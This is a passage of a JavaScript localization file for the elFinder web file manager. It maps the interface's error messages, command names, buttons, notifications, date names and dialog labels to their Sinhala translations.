/**
 * Sinhala translation
 * @author CodeLyokoXtEAM <XcodeLyokoTEAM@gmail.com>
 * @version 2022-03-03
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.si = {
		translator : 'CodeLyokoXtEAM &lt;XcodeLyokoTEAM@gmail.com&gt;',
		language   : 'Sinhala',
		direction  : 'ltr',
		dateFormat : 'Y.m.d h:i A', // will show like: 2022.03.03 01:13 PM
		fancyDateFormat : '$1 h:i A', // will show like: අද 01:13 PM
		nonameDateFormat : 'Ymd-His', // noname upload will show like: 20220303-131342
		messages   : {
			'getShareText' : 'බෙදාගන්න',
			'Editor ': 'කේත සංස්කාරකය',

			/********************************** errors **********************************/
			'error'                : 'දෝෂයකි.',
			'errUnknown'           : 'නොදන්නා දෝෂයකි.',
			'errUnknownCmd'        : 'නොදන්නා විධානයකි.',
			'errJqui'              : 'වලංගු නොවන jQuery UI සැකැස්මකි. තේරිය හැකි, ඇදගෙන යාම සහ ඇද දැමිය හැකි කොටස් ඇතුළත් කළ යුතුය.',
			'errNode'              : 'ElFinder විසින් DOM Element නිර්මාණය කිරීමට අවශ්‍යව අැත.',
			'errURL'               : 'වලංගු නොවන elFinder සැකැස්මකි! URL විකල්පය සැකසා නැත.',
			'errAccess'            : 'භාවිතය අත්හිටුවා ඇත.',
			'errConnect'           : 'පසුබිම(Backend) වෙත සම්බන්ධ වීමට නොහැකිය.',
			'errAbort'             : 'සම්බන්ධතාවය වසාදමා ඇත.',
			'errTimeout'           : 'සම්බන්ධතා කල් ඉකුත්වී ඇත.',
			'errNotFound'          : 'පසුබිම(Backend) සොයාගත නොහැකි විය.',
			'errResponse'          : 'වලංගු නොවන පසුබිම(Backend) ප්‍රතිචාරය.',
			'errConf'              : 'වලංගු නොවන Backend සැකැස්මකි.',
			'errJSON'              : 'PHP JSON මොඩියුලය ස්ථාපනය කර නැත.',
			'errNoVolumes'         : 'කියවිය හැකි එ්කක(volumes) නොමැත.',
			'errCmdParams'         : '"$1" නම් විධානය වලංගු නොවන පරාමිතියකි.',
			'errDataNotJSON'       : 'JSON දත්ත නොවේ.',
			'errDataEmpty'         : 'හිස් දත්තයකි.',
			'errCmdReq'            : 'Backend සඳහා ඉල්ලන ලද විධානයේ නම අවශ්‍ය වේ.',
			'errOpen'              : '"$1" විවෘත කළ නොහැක.',
			'errNotFolder'         : 'අායිත්තම(object) ෆොල්ඩරයක් නොවේ.',
			'errNotFile'           : 'අායිත්තම(object) ගොනුවක් නොවේ.',
			'errRead'              : '"$1" කියවීමට නොහැක.',
			'errWrite'             : '"$1" තුල ලිවීමට නොහැකිය.',
			'errPerm'              : 'අවසරය නොමැත.',
			'errLocked'            : '"$1" අගුළු දමා ඇති අතර එය නැවත නම් කිරීම, සම්පූර්ණයෙන් විස්ථාපනය කිරීම හෝ ඉවත් කිරීම කළ නොහැක.',
			'errExists'            : '"$1" නම් ගොනුව දැනටමත් පවතී.',
			'errInvName'           : 'ගොනු නම වලංගු නොවේ.',
			'errInvDirname'        : 'ෆෝල්ඩර් නම වලංගු නොවේ.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'ෆෝල්ඩරය හමු නොවිණි.',
			'errFileNotFound'      : 'ගොනුව හමු නොවිණි.',
			'errTrgFolderNotFound' : 'ඉලක්කගත ෆෝල්ඩරය "$1" හමු නොවිනි.',
			'errPopup'             : 'බ්‍රවුසරය උත්පතන කවුළුව විවෘත කිරීම වළක්වයි. ගොනු විවෘත කිරීම සඳහා බ්‍රවුසරයේ විකල්ප තුළ එය සක්රිය කරන්න.',
			'errMkdir'             : '"$1" ෆෝල්ඩරය සෑදීමට නොහැකිය.',
			'errMkfile'            : '"$1" ගොනුව සෑදිය නොහැක.',
			'errRename'            : '"$1" නැවත නම් කිරීමට නොහැකි විය.',
			'errCopyFrom'          : '"$1" volume යෙන් ගොනු පිටපත් කිරීම තහනම්ය.',
			'errCopyTo'            : '"$1" volume යට ගොනු පිටපත් කිරීම තහනම්ය.',
			'errMkOutLink'         : 'volume root යෙන් පිටතට සබැඳිය(link) නිර්මාණය කිරීමට නොහැකි විය.', // from v2.1 added 03.10.2015
			'errUpload'            : 'උඩුගත(upload) කිරීමේ දෝෂයකි.',  // old name - errUploadCommon
			'errUploadFile'        : '"$1" උඩුගත(upload) කිරීමට නොහැකි විය.', // old name - errUpload
			'errUploadNoFiles'     : 'උඩුගත(upload) කිරීම සඳහා ගොනු කිසිවක් සොයාගත නොහැකි විය.',
			'errUploadTotalSize'   : 'දත්ත අවසර දී අැති උපරිම ප්‍රමාණය ඉක්මවා ඇත.', // old name - errMaxSize
			'errUploadFileSize'    : 'ගොනු අවසර දී අැති උපරිම ප්‍රමාණය ඉක්මවා ඇත.', //  old name - errFileMaxSize
			'errUploadMime'        : 'ගොනු වර්ගයට අවසර නැත.',
			'errUploadTransfer'    : '"$1" ව මාරු කිරීමේ දෝෂයකි.',
			'errUploadTemp'        : 'upload කිරීම සඳහා තාවකාලික ගොනුව සෑදිය නොහැක.', // from v2.1 added 26.09.2015
			'errNotReplace'        : '"$1" අායිත්තම(object) දැනටමත් මෙම ස්ථානයේ පවතී, වෙනත් වර්ගයකිනි ප්‍රතිස්ථාපනය කළ නොහැක.', // new
			'errReplace'           : '"$1" ප්‍රතිස්ථාපනය කළ නොහැක.',
			'errSave'              : '"$1" සුරැකීමට නොහැක.',
			'errCopy'              : '"$1" පිටපත් කිරීමට නොහැක.',
			'errMove'              : '"$1" සම්පූර්ණයෙන් විස්ථාපනය කිරීමට නොහැක.',
			'errCopyInItself'      : '"$1" තුලට පිටපත් කිරීමට නොහැක.',
			'errRm'                : '"$1" ඉවත් කිරීමට නොහැකි විය.',
			'errTrash'             : 'කුණු-කූඩය තුලට දැමීමට නොහැක.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'මූලාශ්‍රය ගොනු(ව) ඉවත් කළ නොහැක.',
			'errExtract'           : '"$1" වෙතින් ගොනු දිග හැරීමට නොහැක.',
			'errArchive'           : 'සංරක්ෂිතය සෑදීමට නොහැකි විය.',
			'errArcType'           : 'නොගැලපෙන සංරක්ෂණ වර්ගයකි.',
			'errNoArchive'         : 'ගොනුව නොගැලපෙන සංරක්ෂණ වර්ගයක් හෝ සංරක්ෂිතයක් නොවේ.',
			'errCmdNoSupport'      : 'පසුබිම(Backend) මෙම විධානය නොදනී.',
			'errReplByChild'       : '"$1" ෆෝල්ඩරය එහිම අඩංගු අයිතමයක් මගින් ප්‍රතිස්ථාපනය කළ නොහැක.',
			'errArcSymlinks'       : 'ආරක්ෂිත හේතුව නිසා අනුමත නොකෙරෙන සබැඳි සම්බන්දතා හෝ ලිපිගොනු නම් අඩංගු බැවින් සංරක්ෂිතය දිග හැරීම කිරීමට ඉඩ නොදෙන.', // edited 24.06.2012
			'errArcMaxSize'        : 'සංරක්ෂිතය ලිපිගොනු උපරිම ප්‍රමාණය ඉක්මවා ඇත.',
			'errResize'            : 'ප්‍රතිප්‍රමාණය කිරීමට නොහැකි විය.',
			'errResizeDegree'      : 'වලංගු නොවන භ්‍රමණ කෝණයකි.',  // added 7.3.2013
			'errResizeRotate'      : 'රූපය භ්‍රමණය කිරීමට නොහැකි විය.',  // added 7.3.2013
			'errResizeSize'        : 'රූපයේ ප්‍රමාණය වලංගු නොවේ.',  // added 7.3.2013
			'errResizeNoChange'    : 'රූපයේ ප්‍රමාණය වෙනස් නොවුණි.',  // added 7.3.2013
			'errUsupportType'      : 'නොගැලපෙන ගොනු වර්ගයකි.',
			'errNotUTF8Content'    : '"$1" ගොනුව UTF-8 හි නොමැති අතර සංස්කරණය කළ නොහැක.',  // added 9.11.2011
			'errNetMount'          : '"$1" සවි(mount) කිරීමට නොහැක.', // added 17.04.2012
			'errNetMountNoDriver'  : 'ප්‍රොටොකෝලය(protocol) නොගැලපේ.',     // added 17.04.2012
			'errNetMountFailed'    : 'සවි කිරීම(mount කිරීම) අසාර්ථක විය.',         // added 17.04.2012
			'errNetMountHostReq'   : 'ධාරකය(Host) අවශ්‍ය වේ.', // added 18.04.2012
			'errSessionExpires'    : 'ඔබේ අක්‍රියතාව හේතුවෙන් සැසිය(session) කල් ඉකුත් වී ඇත.',
			'errCreatingTempDir'   : 'තාවකාලික ඩිරෙක්ටරයක්(directory) ​​සෑදිය නොහැක: "$1"',
			'errFtpDownloadFile'   : 'FTP වලින් ගොනුව බාගත(download) කිරීමට නොහැකි විය: "$1"',
			'errFtpUploadFile'     : 'ගොනුව FTP වෙත උඩුගත(upload) කිරීමට නොහැකි විය: "$1"',
			'errFtpMkdir'          : 'FTP මත දුරස්ථ නාමාවලියක්(remote directory) නිර්මාණය කිරීමට නොහැකි විය: "$1"',
			'errArchiveExec'       : 'ගොනු සංරක්ෂණය(archiving) කිරීමේදී දෝෂයක් ඇතිවිය: "$1"',
			'errExtractExec'       : 'ගොනු දිගහැරීමේදී(extracting) දෝෂයක් ඇතිවිය: "$1"',
			'errNetUnMount'        : 'විසන්ධි කිරීමට(unmount) නොහැක.', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'UTF-8 වෙත පරිවර්තනය කළ නොහැක.', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'ඔබ ෆෝල්ඩරය උඩුගත(upload) කිරීමට කැමති නම් නවීන බ්‍රවුසරයකින් උත්සාහ කරන්න.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : '"$1" සෙවීම කල් ඉකුත්වී ඇත. සෙවුම් ප්‍රතිඵල අර්ධ වශයෙන් දිස්වේ.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'නැවත බලය(Re-authorization) ලබා දීම අවශ්‍ය වේ.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'තෝරා ගත හැකි උපරිම අයිතම සංඛ්‍යාව $1 ක් වේ.', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'කුණු කූඩයෙන් නැවත ලබා ගත නොහැක. යළි පිහිටුවීමේ ගමනාන්තය(restore destination) හඳුනාගත නොහැක.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'මෙම ගොනු වර්ගයේ සංස්කාරකය හමු නොවිණි.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'සේවාදායකයේ පැත්තෙන්(server side) දෝශයක් ඇතිවිය.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : '"$1" ෆෝල්ඩරය හිස් කිරීමට නොහැක.', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'තවත් $1 දෝෂ ඇත.', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'ඔබට එක් වරකට $1 දක්වා ෆෝල්ඩර සෑදිය හැක.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'සංරක්ෂිතය(archive) නිර්මාණය කරන්න',
			'cmdback'      : 'ආපසු',
			'cmdcopy'      : 'පිටපත් කරන්න',
			'cmdcut'       : 'මුළුමනින්ම පිටපත් කරන්න(Cut)',
			'cmddownload'  : 'බාගත කරන්න(Download)',
			'cmdduplicate' : 'අනුපිටපත් කරන්න(Duplicate)',
			'cmdedit'      : 'ගොනුව සංස්කරණය කරන්න',
			'cmdextract'   : 'සංරක්ෂිතයේ ගොනු දිගහරින්න(Extract)',
			'cmdforward'   : 'ඉදිරියට',
			'cmdgetfile'   : 'ගොනු තෝරන්න',
			'cmdhelp'      : 'මෙම මෘදුකාංගය පිළිබඳව',
			'cmdhome'      : 'නිවහන(Home)',
			'cmdinfo'      : 'තොරතුරු ලබාගන්න',
			'cmdmkdir'     : 'අළුත් ෆෝල්ඩරයක්',
			'cmdmkdirin'   : 'අළුත් ෆෝල්ඩරයක් තුළට', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'නව ගොනුවක්',
			'cmdopen'      : 'විවෘත කරන්න',
			'cmdpaste'     : 'දමන්න(Paste)',
			'cmdquicklook' : 'පූර්ව දර්ශනයක්(Preview)',
			'cmdreload'    : 'නැවත අළුත් කරන්න(Reload)',
			'cmdrename'    : 'නම වෙනස් කරන්න',
			'cmdrm'        : 'මකන්න',
			'cmdtrash'     : 'කුණු කූඩයට දමන්න', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'යළි පිහිටුවන්න(Restore)', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'ගොනු සොයන්න',
			'cmdup'        : 'ප්‍ර්‍රධාන නාමාවලිය(parent directory) වෙත යන්න',
			'cmdupload'    : 'ගොනු උඩුගත(Upload) කරන්න',
			'cmdview'      : 'දර්ශනය(View)',
			'cmdresize'    : 'ප්‍රථිප්‍රමාණය සහ භ්‍රමණය',
			'cmdsort'      : 'වර්ගීකරණය කරන්න',
			'cmdnetmount'  : 'ජාල එ්කකයක් සවි කරන්න(Mount network volume)', // added 18.04.2012
			'cmdnetunmount': 'ගලවන්න(Unmount)', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'පහසු ස්ථානයට(To Places)', // added 28.12.2014
			'cmdchmod'     : 'ක්‍රමය වෙනස් කරන්න', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'ෆෝල්ඩරය විවෘත කරන්න', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'නැවත තීරු පළල පිහිටුවන්න', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'පුළුල් තිරය', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'මාරු කරන්න(Move)', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'ෆෝල්ඩරය හිස් කරන්න', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'නිෂ්ප්‍රභ කරන්න', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'නැවත කරන්න', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'අභිමතයන් (Preferences)', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'සියල්ල තෝරන්න', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'කිසිවක් තෝරන්න එපා', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'විරුද්ධ අාකාරයට තෝරන්න', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'නව කවුළුවක විවෘත කරන්න', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'සඟවන්න (මනාපය)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'වසන්න',
			'btnSave'   : 'සුරකින්න',
			'btnRm'     : 'ඉවත් කරන්න',
			'btnApply'  : 'යොදන්න(Apply)',
			'btnCancel' : 'අවලංගු කරන්න',
			'btnNo'     : 'නැත',
			'btnYes'    : 'ඔව්',
			'btnMount'  : 'සවිකිරීම(Mount)',  // added 18.04.2012
			'btnApprove': 'කරුණාකර $1 අනුමත කරන්න', // from v2.1 added 26.04.2012
			'btnUnmount': 'ගලවන්න(Unmount)', // from v2.1 added 30.04.2012
			'btnConv'   : 'පරිවර්තනය කරන්න', // from v2.1 added 08.04.2014
			'btnCwd'    : 'මෙතන',      // from v2.1 added 22.5.2015
			'btnVolume' : 'එ්කකය(Volume)',    // from v2.1 added 22.5.2015
			'btnAll'    : 'සියල්ල',       // from v2.1 added 22.5.2015
			'btnMime'   : 'MIME වර්ගය', // from v2.1 added 22.5.2015
			'btnFileName':'ගොනුවේ නම',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'සුරකින්න සහ වසන්න', // from v2.1 added 12.6.2015
			'btnBackup' : 'උපස්ථ(Backup) කරන්න', // fromv2.1 added 28.11.2015
			'btnRename'    : 'නම වෙනස් කරන්න',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'නම වෙනස් කරන්න(සියල්ල)', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'පෙර ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'ඊළඟ ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'වෙනත් නමකින් සුරකිමින්(Save As)', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'ෆෝල්ඩරය විවෘත කරමින්',
			'ntffile'     : 'ගොනුව විවෘත කරමින්',
			'ntfreload'   : 'ෆෝල්ඩර් අන්තර්ගතය නැවත අළුත් කරමින්(Reloading)',
			'ntfmkdir'    : 'ෆෝල්ඩරයක් නිර්මාණය කරමින්',
			'ntfmkfile'   : 'ගොනුව නිර්මාණය කරමින්',
			'ntfrm'       : 'අයිතමයන් මකමින්',
			'ntfcopy'     : 'අයිතමයන් පිටපත් කරමින්',
			'ntfmove'     : 'අයිතමයන් සම්පූර්ණයෙන් විස්ථාපනය කරමින්',
			'ntfprepare'  : 'පවතින අයිතම පිරික්සමින්',
			'ntfrename'   : 'ගොනු නැවත නම් කරමින්',
			'ntfupload'   : 'ගොනු උඩුගත(uploading) කරමින්',
			'ntfdownload' : 'ගොනු බාගත(downloading) කරමින්',
			'ntfsave'     : 'ගොනු සුරකිමින්',
			'ntfarchive'  : 'සංරක්ෂණය(archive) සාදමින්',
			'ntfextract'  : 'සංරක්ෂණයෙන්(archive) ගොනු දිගහරිමින්(Extracting)',
			'ntfsearch'   : 'ගොනු සොයමින්',
			'ntfresize'   : 'රූප ප්‍රමාණය වෙනස් කරමින්',
			'ntfsmth'     : 'දෙයක් කරමින්',
			'ntfloadimg'  : 'පින්තූරය පූරණය කරමින්(Loading)',
			'ntfnetmount' : 'ජාල එ්කකයක් සවිකරමින්(Mounting network volume)', // added 18.04.2012
			'ntfnetunmount': 'ජාල එ්කකයක් ගලවමින්(Unmounting network volume)', // from v2.1 added 30.04.2012
			'ntfdim'      : 'පිංතූරයේ මානය(dimension) ලබාගනිමින්', // added 20.05.2013
			'ntfreaddir'  : 'ෆෝල්ඩරයේ තොරතුරු කියවමින්', // from v2.1 added 01.07.2013
			'ntfurl'      : 'සබැඳියේ URL ලබා ගැනීම', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'ගොනු ආකරය වෙනස් කරමින්', // from v2.1 added 20.6.2015
			'ntfpreupload': 'උඩුගත(upload) කරන ලද ගොනු නාමය සත්‍යාපනය කරමින්(Verifying)', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'බාගත කරගැනීම(download) සඳහා ගොනුවක් නිර්මාණය කරමින්', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'මාර්ග(path) තොරතුරු ලබා ගනිමින්', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'උඩුගත කරන ලද(uploaded) ගොනුව සකසමින්', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'කුණු කූඩයට දමමින්', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'කුණු කූඩයට දැමීම යළි පිහිටුවමින්(Doing restore)', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'ගමනාන්ත(destination) ෆෝල්ඩරය පරීක්ෂා කරමින්', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'පෙර මෙහෙයුම(operation) ඉවත් කරමින්', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'පෙර ආපසු හැරවීම යළි සැකසමින්', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'අන්තර්ගතය පරීක්ෂා කිරීම', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'කුණු කූඩය', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'නොදනී',
			'Today'       : 'අද',
			'Yesterday'   : 'ඊයේ',
			'msJan'       : 'ජනවා.',
			'msFeb'       : 'පෙබ.',
			'msMar'       : 'මාර්.',
			'msApr'       : 'අප්‍රේ.',
			'msMay'       : 'මැයි',
			'msJun'       : 'ජූනි',
			'msJul'       : 'ජුලි',
			'msAug'       : 'අගෝ.',
			'msSep'       : 'සැප්.',
			'msOct'       : 'ඔක්තෝ.',
			'msNov'       : 'නොවැ.',
			'msDec'       : 'දෙසැ.',
			'January'     : 'ජනවාරි',
			'February'    : 'පෙබරවාරි',
			'March'       : 'මාර්තු',
			'April'       : 'අප්‍රේල්',
			'May'         : 'මැයි',
			'June'        : 'ජූනි',
			'July'        : 'ජුලි',
			'August'      : 'අගෝස්තු',
			'September'   : 'සැප්තැම්බර්',
			'October'     : 'ඔක්තෝම්බර්',
			'November'    : 'නොවැම්බර්',
			'December'    : 'දෙසැම්බර්',
			'Sunday'      : 'ඉරිදා',
			'Monday'      : 'සඳුදා',
			'Tuesday'     : 'අඟහරුවාදා',
			'Wednesday'   : 'බදාදා',
			'Thursday'    : 'බ්‍රහස්පතින්දා',
			'Friday'      : 'සිකුරාදා',
			'Saturday'    : 'සෙනසුරාදා',
			'Sun'         : 'ඉරිදා',
			'Mon'         : 'සඳු.',
			'Tue'         : 'අඟහ.',
			'Wed'         : 'බදාදා',
			'Thu'         : 'බ්‍රහස්.',
			'Fri'         : 'සිකු.',
			'Sat'         : 'සෙන.',

			/******************************** sort variants ********************************/
			'sortname'          : 'නම අනුව',
			'sortkind'          : 'වර්ගය අනුව',
			'sortsize'          : 'ප්‍රමාණය අනුව',
			'sortdate'          : 'දිනය අනුව',
			'sortFoldersFirst'  : 'ෆෝල්ඩර වලට පළමු තැන',
			'sortperm'          : 'අවසරය අනුව', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'අාකාරය අනුව',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'හිමිකරු අනුව',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'කණ්ඩායම අනුව',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'එලෙසටම රුක්සටහනත්(Treeview)',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'NewFile.txt', // added 10.11.2015
			'untitled folder'   : 'නව ෆෝල්ඩරයක්',   // added 10.11.2015
			'Archive'           : 'නව ලේඛනාගාරය',  // from v2.1 added 10.11.2015
			'untitled file'     : 'නව ගොනුව.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1: ගොනුව',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'තහවුරු කිරීම අවශ්‍යයි',
			'confirmRm'       : 'අයිතමයන් සදහටම ඉවත් කිරීමට අවශ්‍ය බව ඔබට විශ්වාසද?<br/>මෙය අාපසු හැරවිය නොහැකිය!',
			'confirmRepl'     : 'පැරණි අයිතමය නව එකක මගින් ප්‍රතිස්ථාපනය කරන්නද?',
			'confirmRest'     : 'දැනට පවතින අයිතමය කුණු කූඩය තුළ පවතින අයිතමය මගින් ප්‍රතිස්ථාපනය කරන්නද?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'UTF-8 හි නොවේ<br/> UTF-8 වෙත පරිවර්තනය කරන්න ද?<br/>සුරැකීමෙන් පසු අන්තර්ගතය UTF-8 බවට පරිවර්තනය වේ.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'මෙම ගොනුවෙහි කේතන කේත(Character encoding) හඳුනාගත නොහැකි විය. සංස්කරණ කිරීමට එය තාවකාලිකව UTF-8 වෙත පරිවර්තනය කිරීම අවශ්‍ය වේ.<br/>කරුණාකර මෙම ගොනුවෙහි අක්ෂර කේතන කේත(character encoding) තෝරන්න.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'මෙය වෙනස් කර ඇත.<br/>ඔබට වෙනස්කම් සුරැකීමට නොහැකි නම් සිදු කරනු ලැබූ වෙනස්කම් අහිමි වේ.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'කුණු කූඩය තුලට අයිතමය යැවීමට ඔබට අවශ්‍ය ද?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'ඔබට අයිතම "$1" වෙත ගෙන යාමට අවශ්‍ය බව විශ්වාසද?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'සියල්ලටම යොදන්න',
			'name'            : 'නම',
			'size'            : 'ප්‍රමාණය',
			'perms'           : 'අවසරය',
			'modify'          : 'නවීකරණය කෙරුණ ලද්දේ',
			'kind'            : 'ජාතිය',
			'read'            : 'කියවන්න',
			'write'           : 'ලියන්න',
			'noaccess'        : 'ප්‍රවේශයක් නොමැත',
			'and'             : 'සහ',
			'unknown'         : 'නොහඳුනයි',
			'selectall'       : 'සියලු ගොනු තෝරන්න',
			'selectfiles'     : 'ගොනු(ව) තෝරන්න',
			'selectffile'     : 'පළමු ගොනුව තෝරන්න',
			'selectlfile'     : 'අවසාන ගොනුව තෝරන්න',
			'viewlist'        : 'ලැයිස්තු අාකාරය',
			'viewicons'       : 'අයිකන අාකාරය',
			'viewSmall'       : 'කුඩා අයිකන', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'මධ්යම අයිකන', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'විශාල අයිකන', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'අමතර විශාල අයිකන', // from v2.1.39 added 22.5.2018
			'places'          : 'ස්ථාන',
			'calc'            : 'ගණනය කරන්න',
			'path'            : 'මාර්ගය',
			'aliasfor'        : 'සඳහා අන්වර්ථය',
			'locked'          : 'අගුළු දමා ඇත',
			'dim'             : 'මාන(Dimensions)',
			'files'           : 'ගොනු',
			'folders'         : 'ෆෝල්ඩර',
			'items'           : 'අයිතම(Items)',
			'yes'             : 'ඔව්',
			'no'              : 'නැත',
			'link'            : 'සබැඳිය(Link)',
			'searcresult'     : 'සෙවුම් ප්‍රතිඵල',
			'selected'        : 'තෝරාගත් අයිතම',
			'about'           : 'මේ ගැන',
			'shortcuts'       : 'කෙටිමං',
			'help'            : 'උදව්',
			'webfm'           : 'වෙබ් ගොනු කළමනාකරු',
			'ver'             : 'අනුවාදය(version)',
			'protocolver'     : 'ප්‍රොටොකෝලය අනුවාදය(protocol version)',
			'homepage'        : 'ව්‍යාපෘතිය නිවහන',
			'docs'            : 'ලේඛනගත කිරීම',
			'github'          : 'Github හරහා සංවාදයේ යෙදෙන්න',
			'twitter'         : 'Twitter හරහා අපව සම්බන්ධ වන්න',
			'facebook'        : 'Facebook හරහා අප සමඟ එකතු වන්න',
			'team'            : 'කණ්ඩායම',
			'chiefdev'        : 'ප්‍රධාන සංස්කරු(chief developer)',
			'developer'       : 'සංස්කරු(developer)',
			'contributor'     : 'දායකයා(contributor)',
			'maintainer'      : 'නඩත්තු කරන්නා(maintainer)',
			'translator'      : 'පරිවර්තකයා',
			'icons'           : 'අයිකන',
			'dontforget'      : 'සහ ඔබේ තුවාය ගැනීමට අමතක නොකරන්න',
			'shortcutsof'     : 'කෙටිමං අක්‍රීය කර ඇත',
			'dropFiles'       : 'ගොනු මෙතැනට ඇද දමන්න',
			'or'              : 'හෝ',
			'selectForUpload' : 'ගොනු තෝරන්න',
			'moveFiles'       : 'අායිත්තම සම්පූර්ණයෙන් විස්ථාපනය',
			'copyFiles'       : 'අයිතමයන් පිටපත් කරන්න',
			'restoreFiles'    : 'අයිතම නැවත පිහිටුවන්න', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'ස්ථාන වලින් ඉවත් කරන්න',
			'aspectRatio'     : 'දර්ශන අනුපාතය(Aspect ratio)',
			'scale'           : 'පරිමාණය',
			'width'           : 'පළල',
			'height'          : 'උස',
			'resize'          : 'ප්‍රතිප්‍රමානණය',
			'crop'            : 'බෝග',
			'rotate'          : 'කැරකැවීම',
			'rotate-cw'       : 'අංශක 90කින් කරකවන්න CW',
			'rotate-ccw'      : 'අංශක 90කින් කරකවන්න CCW',
			'degree'          : '°',
			'netMountDialogTitle' : 'ජාල පරිමාව සවි කරන්න', // added 18.04.2012
			'protocol'            : 'ප්රොටෝකෝලය', // added 18.04.2012
			'host'                : 'සත්කාරක', // added 18.04.2012
			'port'                : 'වරාය', // added 18.04.2012
			'user'                : 'පරිශීලක', // added 18.04.2012
			'pass'                : 'මුරපදය', // added 18.04.2012
			'confirmUnmount'      : 'ඔබ $1 ඉවත් කරනවාද?',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'බ්‍රවුසරයෙන් ගොනු දමන්න හෝ අලවන්න', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'මෙහි ගොනු දමන්න, URL හෝ පින්තූර (ක්ලිප්බෝඩ්) අලවන්න', // from v2.1 added 07.04.2014
			'encoding'        : 'කේතීකරණය(Encoding)', // from v2.1 added 19.12.2014
			'locale'          : 'දේශීය',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'ඉලක්කය: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'ආදාන MIME වර්ගය අනුව සොයන්න', // from v2.1 added 22.5.2015
			'owner'           : 'හිමිකරු', // from v2.1 added 20.6.2015
			'group'           : 'සමූහය', // from v2.1 added 20.6.2015
			'other'           : 'වෙනත්', // from v2.1 added 20.6.2015
			'execute'         : 'ක්‍රයාත්මක කරන්න', // from v2.1 added 20.6.2015
			'perm'            : 'අවසරය', // from v2.1 added 20.6.2015
			'mode'            : 'මාදිලිය', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'ෆෝල්ඩරය හිස්', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'ෆාේල්ඩරය හිස්\\A අායිත්තම අතහැරීමෙන් අැතුලු කරන්න', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'ෆාේල්ඩරය හිස්\\A දිර්ඝ එබීමෙන් අායිත්තම අැතුලු කරන්න', // from v2.1.6 added 30.12.2015
